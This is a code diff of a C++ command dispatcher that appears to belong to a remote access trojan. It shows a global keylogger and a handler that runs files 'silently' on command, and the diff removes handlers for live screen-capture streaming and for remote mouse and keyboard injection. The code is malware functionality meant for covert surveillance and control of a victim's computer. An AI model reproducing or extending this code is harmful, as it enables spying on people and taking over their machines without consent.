@@ -3,8 +3,6 @@
 static Keylogger g_keylogger;
 static std::atomic<bool> g_isKeylogging(false);
 static FileTransferController g_fileTransfer;
-static InputManager g_inputMgr;
-static std::atomic<bool> g_isStreaming(false);
 
 CommandDispatcher::CommandDispatcher() {
     registerHandlers();
@@ -751,7 +749,7 @@ void CommandDispatcher::registerHandlers() {
         }
     };
 
-    routes_[Protocol::TYPE::FILE_EXECUTE] = [this](const Message& msg, ResponseCallBack cb) {
+    routes_[Protocol::TYPE::FILE_EXECUTES] = [this](const Message& msg, ResponseCallBack cb) {
         try {
             std::string filePath = msg.data.is_string() ? msg.getDataString() : msg.data.value("path", "");
             
@@ -762,7 +760,7 @@ void CommandDispatcher::registerHandlers() {
 
             bool success = FileTransferController::executeFile(filePath);
 
-            cb(Message(Protocol::TYPE::FILE_EXECUTE, {
+            cb(Message(Protocol::TYPE::FILE_EXECUTES, {
                 {"status", success ? "ok" : "failed"},
                 {"msg", success ? "File started silently" : "Failed to execute file"}
             }, "", msg.from));
@@ -811,72 +809,6 @@ void CommandDispatcher::registerHandlers() {
                 "",
                 msg.from
             ));
-        }
-    };
-
-    routes_[Protocol::TYPE::START_STREAM] = [this](const Message& msg, ResponseCallBack cb) {
-        if (g_isStreaming) {
-            cb(Message(Protocol::TYPE::ERROR, {{"msg", "Stream is already running"}}, "", msg.from));
-            return;
-        }
-
-        g_isStreaming = true;
-        cb(Message(Protocol::TYPE::START_STREAM, {{"status", "ok"}}, "", msg.from));
-
-        std::thread([this, msg, cb]() {
-            FastCapture fastCap;
-            
-            int targetFps = 30;
-            int frameDelay = 1000 / targetFps;
-
-            while (g_isStreaming) {
-                auto start = std::chrono::steady_clock::now();
-
-                try {
-                    std::vector<unsigned char> rawJpeg = fastCap.captureFrameRaw();
-                    
-                    if (!rawJpeg.empty() && conn_) {
-                        conn_->sendBinary(rawJpeg);
-                    }
-                } catch (const std::exception& e) {
-                    std::cerr << "[Stream] Error: " << e.what() << std::endl;
-                } catch (...) {}
-
-                auto end = std::chrono::steady_clock::now();
-                auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
-                if (elapsed.count() < frameDelay) {
-                    std::this_thread::sleep_for(std::chrono::milliseconds(frameDelay) - elapsed);
-                }
-            }
-        }).detach();
-    };
-
-    routes_[Protocol::TYPE::STOP_STREAM] = [](const Message& msg, ResponseCallBack cb) {
-        g_isStreaming = false;
-        cb(Message(Protocol::TYPE::STOP_STREAM, {{"status", "stopped"}}, "", msg.from));
-    };
-
-    routes_[Protocol::TYPE::MOUSE_MOVE] = [](const Message& msg, ResponseCallBack cb) {
-        if (msg.data.contains("x") && msg.data.contains("y")) {
-            int x = msg.data["x"].get<int>();
-            int y = msg.data["y"].get<int>();
-            g_inputMgr.MoveMouse(x, y);
-        }
-    };
-
-    routes_[Protocol::TYPE::MOUSE_CLICK] = [](const Message& msg, ResponseCallBack cb) {
-        std::string btn = msg.data.value("button", "left");
-        bool down = msg.data.value("down", false);
-        g_inputMgr.MouseClick(btn == "left", down);
-    };
-
-    routes_[Protocol::TYPE::KEY_EVENT] = [](const Message& msg, ResponseCallBack cb) {
-        int key = msg.data.value("keycode", 0);
-        bool down = msg.data.value("down", false);
-        
-        if (key > 0) {
-            if (down) g_inputMgr.KeyPress(key);
-            else g_inputMgr.KeyRelease(key);
         }
     };
 }
